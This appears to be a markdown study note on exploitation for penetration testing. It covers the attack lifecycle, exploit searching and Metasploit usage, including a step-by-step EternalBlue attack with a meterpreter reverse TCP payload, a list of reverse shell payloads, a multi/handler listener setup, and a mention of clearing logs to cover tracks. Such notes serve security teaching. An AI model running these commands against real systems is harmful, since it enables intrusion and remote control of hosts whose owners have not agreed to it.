
# Exploitation
Exploitation is the act of taking advantage of a vulnerability to gain unauthorized access or execute arbitrary code on a target system.

**Vulnerability ≠ Exploit**
- **Vulnerability** = The weakness/flaw
- **Exploit** = The code/method that leverages the weakness

## Exploitation Lifecycle
```
┌─────────────────────────────────────────────────────────┐
│              EXPLOITATION LIFECYCLE                     │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  1. Reconnaissance                                       │
│     └── Information gathering                           │
│                                                         │
│  2. Scanning & Enumeration                              │
│     └── Find open ports, services, versions             │
│                                                         │
│  3. Vulnerability Identification                         │
│     └── Match service versions with known CVEs          │
│                                                         │
│  4. Exploit Selection                                    │
│     └── Find working exploit for the vulnerability      │
│                                                         │
│  5. Gaining Access (Exploitation)                        │
│     └── Execute the exploit                             │
│                                                         │
│  6. Maintaining Access                                   │
│     └── Establish persistence                           │
│                                                         │
│  7. Post-Exploitation                                    │
│     └── Privilege escalation, lateral movement          │
│                                                         │
│  8. Covering Tracks (Red Team Only)                      │
│     └── Clear logs, remove artifacts                    │
│                                                         │
└─────────────────────────────────────────────────────────┘
```


## Key Exploitation Concepts
1. Proof of Concept (POC)
Demonstration code that proves a vulnerability exists (may not give full access)

2. Exploit
Full weaponized code that can be used to compromise a system

3. Payload
The code executed AFTER successful exploitation (reverse shell, meterpreter, etc.)

4. Shellcode
Small piece of code used as payload (typically assembly)

5. Remote Code Execution (RCE)
Ability to execute arbitrary code on remote system ⭐ Most critical vulnerability


#  Exploitation Methodology
## STEP 1: Identify the Vulnerability
```bash
# 1. Version-based vulnerability search
searchsploit apache 2.4.49

# 2. Automated vulnerability scanners
nmap --script vuln 192.168.1.1
nessus, openvas, nikto, etc.

# 3. Manual testing
Testing for SQLi, XSS, command injection, etc.

# 4. CVE databases
cve.mitre.org
nvd.nist.gov
exploit-db.com
```

## STEP 2: Find an Exploit

### 1. Exploit-DB 
### 2. GitHub

### 3. Metasploit Framework
```bash
msfconsole
search type:exploit name:apache
```

### 4. Google Dorks
```
"CVE-2021-44228" exploit
"ProFTPd 1.3.5" exploit POC
intitle:"index of" exploit
```

## STEP 3: Understand the Exploit

**CRITICAL:** Never run exploits blindly!
Check for:
```
✓ What does the exploit do?
✓ What are the requirements?
✓ Does it need authentication?
✓ What payload does it deliver?
✓ Is it stable or does it crash the service?
✓ Read the exploit code (especially Python/Bash)
✓ Check for hardcoded IPs/ports to modify
```

___
#  Metasploit Framework 
World's most used penetration testing framework with 2000+ exploits
```
# Start PostgreSQL (required)
sudo systemctl start postgresql

# Initialize database (first time only)
sudo msfdb init

# Start Metasploit
msfconsole
```


1) **Exploits**
Used to exploit a vulnerability.

**Example:**
- SMB exploits
- web app RCE exploits
- service-based exploits

2) **Payloads**
What you get after exploitation.

**Examples:**
- reverse shell
- bind shell
- Meterpreter session

3) **Auxiliary Modules**
Non-exploit modules like:
- scanners (port scan, smb scan, http scan)
- brute force modules
- fuzzers
- sniffers

3) **Meterpreter**
A powerful post-exploitation agent.

**It allows:**
- file upload/download
- screenshots
- privilege escalation
- dumping creds
- pivoting

### Components
| Term          | What it is        | Main use                                |
| :------------ | :---------------- | :-------------------------------------- |
| `Metasploit`  | Full framework    | Everything (exploits + payloads + post) |
| `msfconsole`  | CLI interface     | Running modules & managing attacks      |
| `msfvenom`    | Payload generator | Creating payloads / shellcode           |
| `meterpreter` | reverse shell     | alternative of  cmd                     |

**Example:**
```bash
# 1. Start Metasploit
msfconsole

# 2. Search for exploit
search ms17-010

# 3. Use the exploit
use exploit/windows/smb/ms17_010_eternalblue

# 4. Show options
show options

# 5. Set required options
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5

# 6. Check if target is vulnerable
check

# 7. Show available payloads
show payloads

# 8. Set payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 9. Show options again (verify everything)
show options

# 10. Exploit
exploit
```

**If successful:**
```bash
[*] Started reverse TCP handler on 192.168.1.5:4444
[*] Sending stage (200774 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened

meterpreter >
```

### Useful payloads:
```bash
# Linux Reverse Shell
linux/x86/meterpreter/reverse_tcp

# Windows Reverse Shell (x64)
windows/x64/meterpreter/reverse_tcp

# Windows Reverse Shell (x86)
windows/meterpreter/reverse_tcp

# Command Shell (simpler, smaller)
cmd/unix/reverse
cmd/windows/reverse

# Web Payloads
php/meterpreter/reverse_tcp
jsp/meterpreter/reverse_tcp
```


## Manual Exploitation

### Using Python Script

### Metasploit Multi Handler:
```bash
msfconsole

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit -j  # -j = run as background job
```